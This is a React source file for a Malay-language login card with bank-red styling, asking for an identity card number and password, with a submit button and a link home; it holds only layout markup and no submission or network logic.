import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Link } from "react-router-dom";

const LoginPage = () => {
  return (
    <Card className="w-full max-w-sm text-left shadow-lg animate-fade-in-up">
      <CardHeader>
        <CardTitle className="text-2xl font-bold text-foreground">Log Masuk</CardTitle>
        <CardDescription className="text-foreground/80">
          Masukkan nombor kad pengenalan dan kata laluan anda.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="ic-number" className="text-foreground">No. Kad Pengenalan</Label>
            <Input id="ic-number" placeholder="Contoh: 900101-01-1234" required className="bg-bank-islam-red-light border-bank-islam-red-dark placeholder:text-foreground/50" />
          </div>
          <div className="space-y-2">
            <Label htmlFor="password" className="text-foreground">Kata Laluan</Label>
            <Input id="password" type="password" required className="bg-bank-islam-red-light border-bank-islam-red-dark placeholder:text-foreground/50" />
          </div>
          <Button type="submit" className="w-full bg-primary hover:bg-primary/90 text-primary-foreground">
            Log Masuk
          </Button>
          <div className="mt-4 text-center text-sm">
            <Link to="/" className="underline text-primary/80 hover:text-primary">
              Kembali ke Laman Utama
            </Link>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default LoginPage;